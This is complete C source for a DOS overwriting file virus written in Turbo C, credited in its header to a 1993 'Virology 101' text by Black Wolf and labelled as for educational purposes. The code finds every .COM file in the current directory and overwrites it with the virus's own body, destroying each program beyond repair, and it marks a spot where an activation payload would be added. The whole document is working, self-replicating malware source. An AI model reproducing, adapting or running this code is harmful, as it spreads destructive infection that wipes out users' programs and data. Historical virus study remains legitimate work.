       /* This is a simple overwriting virus programmed in Turbo C */
       /*  It will infect all .COM files in the current directory  */
       /*    Infections destroy the programs and cannot be cured   */
       /*   It was presented in Virology 101 (c) 1993 Black Wolf   */
       /*     FOR EDUCATIONAL PURPOSES ONLY, DO NOT RELEASE!       */

       #include <stdio.h>
       #include <dos.h>
       #include <dir.h>

       FILE *Virus,*Host;
       int x,y,done;
       char buff[256];
       struct ffblk ffblk;

       main()
       {
        done = findfirst("*.COM",&ffblk,0);   /* Find a .COM file */
          while (!done)               /* Loop for all COM's in DIR*/
           {
           printf("Infecting  %s\n", ffblk.ff_name);    /* Inform user */
           Virus=fopen(_argv[0],"rb");          /* Open infected file  */
           Host=fopen(ffblk.ff_name,"rb+");     /* Open new host file  */

           x=9504;                               /* Virus size - must   */
                                                 /* be correct for the  */
                                                 /* compiler it is made */
                                                 /* on, otherwise the   */
                                                 /* entire virus may not*/
                                                 /* be copied!!         */
           while (x>256)                         /* OVERWRITE new Host  */
               {                                 /* Read/Write 256 byte */
               fread(buff,256,1,Virus);          /* chunks until bytes  */
               fwrite(buff,256,1,Host);          /* left < 256          */
               x-=256;
               }
           fread(buff,x,1,Virus);                /* Finish off copy     */
           fwrite(buff,x,1,Host);
           fcloseall();                          /* Close both files and*/
           done = findnext(&ffblk);              /* go for another one. */
           }
                                                 /* Activation would go */
                                                 /* here                */
         return (0);                             /* Terminate           */
       }
